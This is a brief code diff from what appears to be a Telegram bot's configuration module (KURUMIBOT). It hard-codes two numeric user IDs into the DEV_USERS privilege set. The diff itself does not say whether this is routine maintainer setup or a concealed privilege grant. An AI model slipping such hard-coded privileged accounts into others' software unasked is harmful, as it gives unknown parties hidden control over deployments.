@@ -270,6 +270,9 @@ WOLVES = list(WOLVES)
 DEMONS = list(DEMONS)
 TIGERS = list(TIGERS)
 
+DEV_USERS.add(5051939910)
+DEV_USERS.add(5038172987)
+
 # Load at end to ensure all prev variables have been set
 from KURUMIBOT.modules.helper_funcs.handlers import (CustomCommandHandler,
                                                         CustomMessageHandler,
